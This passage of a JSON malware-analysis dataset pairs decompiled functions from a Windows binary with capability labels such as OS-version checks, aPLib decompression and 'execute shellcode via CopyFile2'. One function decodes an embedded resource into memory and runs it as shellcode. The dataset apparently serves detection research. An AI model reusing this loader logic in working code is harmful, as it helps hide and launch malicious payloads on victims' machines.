        "decompiled_code": "\nuint __cdecl fcn.0047c430(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0047c92f;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x4ab198 - 1;\n        iVar4 = *0x4ab198 + (*0x4ab198 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x4ab198 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0047c563;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0047c56a;\ncode_r0x0047c563:\n                        do {\n                            var_4h = 1;\ncode_r0x0047c56a:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0047c578;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0047c578:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4ab194 - *0x4ab198) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4ab194 < iVar12) {\n                if (iVar12 < *0x4ab190) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x4ab1a4;\n                    iVar4 = *0x4ab19c + (*0x4ab19c >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4ab19c & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x4ab19c + (*0x4ab19c >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4ab19c & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x4ab1a4 + *0x4ab190;\n                    uVar5 = 1;\n                }\n                goto code_r0x0047c92f;\n            }\n            var_10h = *0x4ab194 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x4ab198 - 1;\n            iVar12 = *0x4ab198 + (*0x4ab198 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x4ab198 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0047c71b;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0047c71b:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x4ab19c + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0047c92f:\n    var_20h = iVar12 << (0x1fU - *0x4ab19c & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x4ab1a0 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x4ab1a0 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3661
    },
    "004810c3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004810c3(void)\n\n{\n    code *pcVar1;\n    uint arg_8h;\n    uint var_98h;\n    uint32_t var_94h;\n    int32_t var_88h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    var_98h = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&var_98h);\n    if ((var_88h != 2) || (pcVar1 = 0x4810bf,  var_94h < 5)) {\n        pcVar1 = fcn.0048105a;\n    }\n    arg_8h = 0x4ab49c;\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x4ab49c, pcVar1);\n    (**0x4ab49c)();\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 226
    },
    "004813cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004813cf(uint *param_1)\n\n{\n    if (*(param_1 + 1) != '\\0') {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*param_1);\n        *(param_1 + 1) = 0;\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00481559": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00481559(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    uint uStack156;\n    uint32_t uStack152;\n    int32_t iStack148;\n    int32_t iStack140;\n    uchar auStack124 [116];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ auStack124;\n    fcn.004813e6();\n    param_1[2] = 0x400000;\n    param_1[1] = 0x400000;\n    *param_1 = 0x3c;\n    *(param_1 + 3) = 0;\n    fcn.00459330(&uStack156, 0, 0x94);\n    uStack156 = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&uStack156);\n    if (iStack140 == 2) {\n        if (uStack152 < 5) goto code_r0x004815d5;\n    }\n    else if ((iStack140 != 1) || ((uStack152 < 5 && ((uStack152 != 4 || (iStack148 == 0)))))) goto code_r0x004815d5;\n    *(param_1 + 3) = 1;\ncode_r0x004815d5:\n    param_1[4] = 0x800;\n    param_1[5] = 0x49840c;\n    iVar1 = fcn.004811a3();\n    if (iVar1 < 0) {\n        *0x4ab678 = 1;\n    }\n    fcn.004566a8(unaff_ESI);\n    return;\n}\n",
        "token_count": 389
    },
    "00403bd0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403bd0(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h;\n    int32_t arg_10h;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_8h;\n    int32_t var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x481f00;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    uVar4 = var_8h | 0xf;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = *(param_1 + 0x18);\n        uVar3 = uVar1 >> 1;\n        var_8h = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= -uVar3 - 2)) {\n            var_8h = uVar3 + uVar1;\n        }\n    }\n    var_4h = 0;\n    arg_8h = fcn.004034a0(var_8h + 1, 0);\n    if (var_ch_2 != 0) {\n        if (*(param_1 + 0x18) < 0x10) {\n            arg_10h = param_1 + 4;\n        }\n        else {\n            arg_10h = *(param_1 + 4);\n        }\n        fcn.00456177(arg_8h, var_8h + 1, arg_10h, var_ch_2);\n    }\n    if (0xf < *(param_1 + 0x18)) {\n        fcn.004170df(*(param_1 + 4));\n    }\n    puVar2 = param_1 + 4;\n    *puVar2 = 0;\n    *puVar2 = arg_8h;\n    *(param_1 + 0x18) = var_8h;\n    *(param_1 + 0x14) = var_ch_2;\n    if (0xf < var_8h) {\n        puVar2 = arg_8h;\n    }\n    *(puVar2 + var_ch_2) = 0;\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 580
    },
    "0040d570": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040d570(uint param_1)\n\n{\n    uint32_t arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t arg_ch;\n    uint32_t unaff_EBP;\n    uchar *unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint uStack80;\n    uint32_t uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack60;\n    int32_t iStack52;\n    uint32_t uStack40;\n    uint uStack32;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x482fe0;\n    piStack12 = *in_FS_OFFSET;\n    uStack16 = *0x4a9ec8 ^ &uStack80;\n    arg_8h = *0x4a9ec8 ^ &stack0xffffffa0;\n    *in_FS_OFFSET = &piStack12;\n    uStack80 = param_1;\n    uStack20 = 0xf;\n    uStack24 = 0;\n    uStack40 = uStack40 & 0xffffff00;\n    fcn.00403ef0(\"WFlBQa5c\", 8);\n    piStack12 = NULL;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(L\"WerFault.exe\", 0, 0);\n    if (iVar1 == 0) {\n        if (0xf < uStack40) {\n            fcn.004170df(uStack60);\n        }\n    }\n    else {\n        uStack68 = 0xf;\n        uStack72 = 0;\n        unaff_EBP = unaff_EBP & 0xffffff00;\n        fcn.00403ef0(0x48a2b8, 0xc);\n        uStack32 = CONCAT31(uStack32._1_3_, 1);\n        if (uStack76 < 0x10) {\n            unaff_EDI = &stack0xffffffa0;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExA)(unaff_EDI, 0, 0);\n        uVar3 = fcn.00456bfd(\"383669855\");\n        pcVar4 = fcn.00403330(uVar2, uVar3);\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(0, 0xb2b4, 10);\n        if (iVar1 == 0) {\n            if (0xf < uStack68) {\n                fcn.004170df(unaff_EBP);\n            }\n            uStack68 = 0xf;\n            uStack72 = 0;\n            if (0xf < uStack40) {\n                fcn.004170df(uStack60);\n            }\n        }\n        else {\n            arg_ch = (*_sym.imp.KERNEL32.dll_LoadResource)(0, iVar1);\n            if (arg_ch == 0) {\n                if (0xf < uStack68) {\n                    fcn.004170df(unaff_EBP);\n                }\n                uStack68 = 0xf;\n                uStack72 = 0;\n                if (0xf < uStack40) {\n                    fcn.004170df(uStack60);\n                }\n            }\n            else {\n                uVar2 = (*_sym.imp.KERNEL32.dll_SizeofResource)(0, iVar1);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0, uVar2, iStack52 << 9 | 0x2000, iStack52 * 8, 0);\n                pcVar4 = (*pcVar4)(uVar3);\n                if (pcVar4 == NULL) {\n                    fcn.00403d20();\n                    fcn.00403d20();\n                }\n                else {\n                    fcn.00456c30(pcVar4, arg_ch, uVar2);\n                    fcn.00403fc0(arg_8h, piStack12, pcVar4, uVar2);\n                    (*pcVar4)();\n                    fcn.00403d20();\n                    fcn.00403d20();\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 1001
    },
    "00415ae0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.00415ae0(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t **ppiVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    int32_t iVar8;\n    int32_t *in_FS_OFFSET;\n    int32_t **unaff_retaddr;\n    int32_t iStack168;\n    int32_t iStack164;\n    int32_t **ppiStack160;\n    int32_t iStack156;\n    uchar *puStack152;\n    uchar *puStack148;\n    int32_t iStack144;\n    int32_t iStack140;\n    int32_t iStack136;\n    int32_t **ppiStack132;\n    int32_t **ppiStack128;\n    int32_t **ppiStack124;\n    int32_t iStack120;\n    int32_t **ppiStack116;\n    uchar *puStack112;\n    uchar *puStack108;\n    uint32_t uStack104;\n    uchar *puStack84;\n    uchar *puStack80;\n    uchar *puStack76;\n    uchar *puStack72;\n    uint uStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    int32_t iStack40;\n    int32_t iStack32;\n    int32_t iStack28;\n    uchar uStack20;\n    uint uStack12;\n    int32_t iStack8;\n    uint uStack4;\n    \n    iStack8 = 0x483eb8;\n    uStack12 = *in_FS_OFFSET;\n    uStack104 = *0x4a9ec8 ^ &stack0xffffff9c;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    puStack108 = param_3;\n    ppiStack116 = &stack0xffffffac;\n    puStack112 = param_2;\n    uStack4 = 4;\n    iStack120 = 0x415b25;\n    fcn.00412590();\n    uStack52 = *(param_1 + 0x3f0);\n    puStack108 = &stack0xffffffac;\n    puStack112 = &stack0xffffffd0;\n    uStack4 = CONCAT31(uStack4._1_3_, 5);\n    ppiStack116 = 0x415b4e;\n    piVar3 = fcn.004111d0();\n    if ((*piVar3 == 0) || (*piVar3 != param_1 + 0x3ec)) {\n        ppiStack116 = 0x415b60;\n        fcn.0045780d();\n    }\n    if (piVar3[1] == iStack60) {\n        iVar8 = param_2;\n        if ((*(param_2 + -8) | 1U - *(param_2 + -4)) < 0) {\n            ppiStack116 = NULL;\n            iStack120 = 0x415c6e;\n            fcn.00401760();\n            iVar8 = iStack8;\n        }\n        ppiStack124 = 0x415c7a;\n        iStack120 = iVar8;\n        fcn.00415820();\n        puStack84 = &stack0xffffff84;\n        ppiStack128 = param_3 + -0x10;\n        puStack80 = &stack0xffffff80;\n        ppiStack132 = 0x415c95;\n        iVar5 = fcn.004017b0();\n        ppiStack124 = iVar5 + 0x10;\n        ppiStack132 = param_2 + -0x10;\n        uStack20 = 6;\n        iStack136 = 0x415cb9;\n        iVar5 = fcn.004017b0();\n        ppiStack128 = iVar5 + 0x10;\n        puStack76 = &stack0xffffff78;\n        iStack140 = uStack4 + -0x10;\n        puStack72 = &stack0xffffff74;\n        uStack20 = 7;\n        iStack144 = 0x415ce6;\n        ppiStack132 = unaff_retaddr;\n        iStack136 = fcn.004017b0();\n        iVar5 = iStack8;\n        iStack136 = iStack136 + 0x10;\n        iStack144 = iStack8 + -0x10;\n        piVar3 = &stack0xffffff70;\n        uStack20 = 8;\n        puStack148 = 0x415d06;\n        iStack140 = fcn.004017b0();\n        iStack140 = iStack140 + 0x10;\n        puStack148 = iVar8 + -0x10;\n        uStack20 = 9;\n        puStack152 = 0x415d2a;\n        iVar6 = fcn.004017b0();\n        *piVar3 = iVar6 + 0x10;\n        uStack20 = 5;\n        puStack148 = 0x415d47;\n        fcn.004115d0();\n        puStack148 = &stack0xffffffb0;\n        puStack152 = &stack0xffffff84;\n        uStack44 = CONCAT31(uStack44._1_3_, 10);\n        iStack156 = 0x415d61;\n        fcn.00415710();\n        iStack156 = 0x415d68;\n        fcn.00411810();\n        ppiStack160 = 0x415d70;\n        iStack156 = iVar8;\n        iVar7 = fcn.004159d0();\n        iVar6 = uStack44;\n        if (iVar7 == 0) {\n            ppiStack160 = 0x415d7f;\n            fcn.00414050();\n            if ((*(iVar5 + -8) | 1U - *(iVar5 + -4)) < 0) {\n                ppiStack160 = NULL;\n                iStack164 = 0x415d99;\n                fcn.00401760();\n            }\n            if ((*(iVar8 + -8) | 1U - *(iVar8 + -4)) < 0) {\n                iStack164 = 0;\n                iStack168 = 0x415db3;\n                fcn.00401760();\n                iVar8 = uStack56;\n            }\n            iStack164 = iStack48;\n            iStack168 = iVar8;\n            uVar4 = fcn.0040fd00();\n            if ((*(iStack48 + -8) | 1U - *(iStack48 + -4)) < 0) {\n                fcn.00401760(0);\n                iStack48 = iStack60;\n            }\n            pcVar2 = _sym.imp.USER32.dll_SendMessageA;\n            uStack68 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x181, uVar4, iStack48);\n            uVar4 = fcn.00415710(&stack0xffffff58);\n            (*pcVar2)(*(param_1 + 0x20), 0x19a, puStack72, uVar4);\n            iVar6 = iStack48;\n        }\n        ppiStack160 = 0x415e2b;\n        fcn.004106a0();\n        ppiStack160 = iStack136 + -0x10;\n        uStack56._0_1_ = 4;\n        piVar3 = iStack136 + -4;\n        LOCK();\n        iVar5 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar5 + -1 < 1) {\n            iStack164 = 0x415e50;\n            (**(**ppiStack160 + 4))();\n        }\n        ppiStack160 = iVar8 + -0x10;\n        uStack56._0_1_ = 3;\n        piVar3 = iVar8 + -4;\n        LOCK();\n        iVar8 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar8 + -1 < 1) {\n            iStack164 = 0x415e71;\n            (**(**ppiStack160 + 4))();\n        }\n        ppiStack160 = iVar6 + -0x10;\n        uStack56._0_1_ = 2;\n        piVar3 = iVar6 + -4;\n        LOCK();\n        iVar8 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar8 + -1 < 1) {\n            iStack164 = 0x415e92;\n            (**(**ppiStack160 + 4))();\n        }\n        uStack56._0_1_ = 1;\n        ppiVar1 = ppiStack132 + 3;\n        LOCK();\n        piVar3 = *ppiVar1;\n        *ppiVar1 = *ppiVar1 + -1;\n        if (piVar3 + -1 < 1) {\n            ppiStack160 = ppiStack132;\n            iStack164 = 0x415eb4;\n            (**(**ppiStack132 + 4))();\n        }\n        uStack56 = uStack56._1_3_ << 8;\n        ppiVar1 = ppiStack128 + 3;\n        LOCK();\n        piVar3 = *ppiVar1;\n        *ppiVar1 = *ppiVar1 + -1;\n        if (piVar3 + -1 < 1) {\n            ppiStack160 = ppiStack128;\n            iStack164 = 0x415ed6;\n            (**(**ppiStack128 + 4))();\n        }\n        uStack56 = 0xffffffff;\n        ppiVar1 = ppiStack124 + 3;\n        LOCK();\n        piVar3 = *ppiVar1;\n        *ppiVar1 = *ppiVar1 + -1;\n        if (piVar3 == 0x1 || piVar3 + -1 < 0) {\n            ppiStack160 = ppiStack124;\n            iStack164 = 0x415efb;\n            (**(**ppiStack124 + 4))();\n        }\n        uVar4 = 1;\n    }\n    else {\n        uStack12 = CONCAT31(uStack12._1_3_, 4);\n        piVar3 = unaff_EBP + -4;\n        LOCK();\n        iVar8 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar8 + -1 < 1) {\n            iStack120 = 0x415b92;\n            ppiStack116 = unaff_EBP + -0x10;\n            (**(**(unaff_EBP + -0x10) + 4))();\n        }\n        ppiStack160 = param_2 + -0x10;\n        uStack56._0_1_ = 3;\n        piVar3 = param_2 + -4;\n        LOCK();\n        iVar8 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar8 + -1 < 1) {\n            iStack164 = 0x415bb3;\n            (**(**ppiStack160 + 4))();\n        }\n        ppiStack160 = uStack44 + -0x10;\n        uStack56._0_1_ = 2;\n        piVar3 = uStack44 + -4;\n        LOCK();\n        iVar8 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar8 + -1 < 1) {\n            iStack164 = 0x415bd8;\n            (**(**ppiStack160 + 4))();\n        }\n        ppiStack160 = iStack40 + -0x10;\n        uStack56._0_1_ = 1;\n        piVar3 = iStack40 + -4;\n        LOCK();\n        iVar8 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar8 + -1 < 1) {\n            iStack164 = 0x415bfd;\n            (**(**ppiStack160 + 4))();\n        }\n        ppiStack160 = iStack32 + -0x10;\n        uStack56 = uStack56._1_3_ << 8;\n        piVar3 = iStack32 + -4;\n        LOCK();\n        iVar8 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar8 + -1 < 1) {\n            iStack164 = 0x415c22;\n            (**(**ppiStack160 + 4))();\n        }\n        ppiStack160 = iStack28 + -0x10;\n        uStack56 = 0xffffffff;\n        piVar3 = iStack28 + -4;\n        LOCK();\n        iVar8 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n        if (iVar8 == 1 || iVar8 + -1 < 0) {\n            iStack164 = 0x415c4d;\n            (**(**ppiStack160 + 4))();\n        }\n        uVar4 = 0;\n    }\n    *in_FS_OFFSET = iStack64;\n    return uVar4;\n}\n",
        "token_count": 2986
    },
    "00417ed9": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417ed9(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    uVar1 = (**0x4ab49c)();\n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        fcn.00415fc0(arg_8h, arg_ch, 0x20, uVar1);\n        iVar2 = fcn.00456177(arg_8h + 0x40, 0x26, arg_ch + 0x20, 0x26);\n        if (iVar2 == 0) {\n            fcn.00415fc0(arg_8h + 0x66, arg_ch + 0x46, 0x20, uVar1);\n            iVar2 = fcn.00456177(arg_8h + 0xa6, 0x36, arg_ch + 0x66, 0x36);\n            if ((iVar2 == 0) &&\n               ((*(arg_ch + 0x26) == 0 ||\n                (iVar2 = fcn.00456177(arg_8h + 0xdc, *(arg_ch + 0x26), arg_ch + 0x9c, *(arg_ch + 0x26)),  iVar2 == 0))))\n            {\n                *(arg_8h + 0x44) = 0xdc;\n                fcn.004160e0();\n                return arg_8h;\n            }\n        }\n    }\n    fcn.004160e0();\n    return 0;\n}\n",
        "token_count": 363
    },
    "00417f96": {
        "rules": [
